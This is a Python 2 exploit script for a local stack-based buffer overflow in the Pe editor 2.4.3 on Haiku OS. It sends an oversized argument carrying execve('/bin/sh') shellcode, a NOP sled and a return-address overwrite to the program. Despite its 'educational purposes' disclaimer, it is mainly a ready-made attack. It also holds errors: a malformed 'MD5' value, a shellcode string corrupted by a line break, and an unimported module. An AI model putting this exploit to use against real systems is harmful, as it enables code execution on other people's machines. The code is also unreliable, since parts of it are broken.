# Tested on: Haiku OS Alpha x86
#
# Description: Pe v2.4.3 and prior is prone to a stack-based buffer overflow
# vulnerability because the application fails to perform adequate
# boundary-checks on user-supplied input.
#
# An attacker could exploit this issue to execute arbitrary code in the
# context of the application. Failed exploit attempts will result in a
# denial-of-service condition.
#
# Vendor homepage: http://hg.berlios.de/repos/pe-editor
# Tested on: Haiku-OS Alpha Pe 2.4.3
# MD5: 3vf34s2e9c9324c9876b2b02283a9f1247

import os,subprocess
def run():
  try:
    print "# Pe v2.4.3 Stack-Based Overflow by Juan Sacco"
    print "# It&#039;s Fuzzing time on unusable exploits"
    print "# This exploit is for educational purposes only"
    # Basic structure: JUNK + SHELLCODE + NOPS + EIP

    junk = "\x41"*1000
    shellcode = "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\
xb0\x0b\xcd\x80"
    nops = "\x90"*12
    eip = "\x60\xec\xff\x07"
    subprocess.call(["pe",&#039;  &#039;, junk + shellcode + nops + eip])

  except OSError as e:
    if e.errno == os.errno.ENOENT:
        print "PE not found!"
    else:
        print "Error executing exploit"
    raise

def howtousage():
  print "Sorry, something went wrong"
  sys.exit(-1)

if __name__ == &#039;__main__&#039;:
  try:
    print "Exploit PE 2.4.3 Local Overflow Exploit"
    print "Author: Juan Sacco"
  except IndexError:
    howtousage()
run()

